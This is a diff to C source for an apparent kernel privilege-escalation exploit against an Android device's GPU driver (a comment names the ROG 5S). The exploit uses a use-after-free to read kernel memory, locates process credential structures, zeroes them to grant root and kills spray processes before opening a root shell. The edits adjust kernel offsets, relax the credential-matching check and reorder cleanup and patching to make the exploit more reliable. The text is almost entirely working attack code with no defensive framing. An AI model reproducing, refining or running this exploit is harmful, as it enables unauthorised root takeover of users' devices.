@@ -32,8 +32,8 @@
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_CRED          0x6b0
-#define OFFSET_REAL_CRED     0x6b8
+#define OFFSET_CRED          0x870
+#define OFFSET_REAL_CRED     0x878
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -1201,31 +1201,26 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
-    int max_patches = 1000; // Stability: limit patches per scan
+    int max_patches = 200; // Even more conservative for ROG 5S
     uint8_t *page = malloc(PAGE_SIZE);
     
     // Scan all pages in the UAF range
     for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
         if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
-            // CRED structures are aligned to 8 or 16 bytes. We check every 8 bytes.
             for (int off = 0; off < PAGE_SIZE - 64; off += 8) {
                 uint32_t usage = *(uint32_t *)(page + off);
                 uint32_t ruid = *(uint32_t *)(page + off + 4);
-                uint32_t rgid = *(uint32_t *)(page + off + 8);
-                uint32_t suid = *(uint32_t *)(page + off + 12);
-                uint32_t sgid = *(uint32_t *)(page + off + 16);
                 
-                // Refined CRED pattern: usage > 0, UID == GID == target_uid
-                if (usage >= 1 && usage <= 255 && ruid == target_uid && rgid == target_uid && suid == target_uid && sgid == target_uid) {
-                    // One final check: usage 0 is suspicious, already patched is pointless
+                // Refined CRED pattern: usage > 0, UID == target_uid
+                if (usage >= 1 && usage <= 255 && ruid == target_uid) {
                     if (ruid == 0) continue; 
 
                     patch_count++;
                     if (patch_count > max_patches) break;
 
-                    if (patch_count % 100 == 0) {
+                    if (patch_count % 50 == 0) {
                         fprintf(stderr, "[PARENT] Patched %d structures...\n", patch_count);
-                        usleep(10000); // Throttling for stability
+                        usleep(50000); // More delay
                     }
                     
                     uint8_t zero_creds[32] = {0};
@@ -1777,16 +1772,19 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 if (found_cred_ptr != 0) {
                     uint32_t cred_check[3]; // usage, uid, gid
                     if (gpu_read_task_struct(fd, found_cred_ptr, (uint8_t *)cred_check, 12) == 0) {
-                        fprintf(stderr, "    [+++] VERIFIED CRED FOUND: 0x%lx (UID %u, GID %u, usage %u)\n", 
-                                (unsigned long)found_cred_ptr, cred_check[1], cred_check[2], cred_check[0]);
+                        if (cred_check[0] > 0) {
+                            fprintf(stderr, "    [+++] VERIFIED CRED FOUND: 0x%lx (UID %u, GID %u, usage %u)\n", 
+                                    (unsigned long)found_cred_ptr, cred_check[1], cred_check[2], cred_check[0]);
+                        } else {
+                            fprintf(stderr, "    [!] Warning: Found CRED at 0x%lx has usage 0. This is likely a false positive.\n", 
+                                    (unsigned long)found_cred_ptr);
+                            found_cred_ptr = 0; // Invalidate so dynamic search or fallback continues
+                        }
                     }
                 }
 
-                // AUTOMATIC PATCHING TRIGGERED
-                fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", found_pid);
-                
-                // Parent patches it RIGHT NOW while we have the FD
-                parent_patch_root(fd, found_cred_ptr);
+                // RECORD TARGET INFO AND EXIT SCAN (Cleanup will happen in main)
+                fprintf(stderr, "\n    [!] TARGET LOCATED (PID %d). Preparing for cleanup and patch...\n", found_pid);
                 
                 marker_found = 1;
                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
@@ -2549,19 +2547,29 @@ restart:;
     }
 
     pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-    fprintf(stderr, "[+] Target identified: PID %d. Cleaning up spray...\n", target_pid);
+    uint64_t target_cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
+    fprintf(stderr, "[+] Target identified: PID %d. Cleaning up spray processes...\n", target_pid);
     
-    // Fast cleanup: Kill everyone in the spray group EXCEPT the target
+    // 1. FAST CLEANUP FIRST to free memory (avoids Signal 9)
     if (spray_pgrp > 0) {
+        int killed = 0;
         for (int i = 0; i < total_sprayed; i++) {
             pid_t p = spray_ctrl[i].pid;
             if (p > 0 && p != target_pid) {
                 kill(p, SIGKILL);
+                killed++;
             }
         }
+        fprintf(stderr, "[+] Sent SIGKILL to %d spray processes. Reaping...\n", killed);
     }
     reap_all_children();
-    fprintf(stderr, "[+] Cleanup complete. Proceeding to root shell...\n"); 
+    usleep(200000);
+
+    // 2. NOW PERFORM PATCHING with free memory
+    fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", target_pid);
+    parent_patch_root(fd, target_cred_ptr);
+
+    fprintf(stderr, "[+] Patching sequence complete. Proceeding to root shell...\n"); 
 
     fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
     
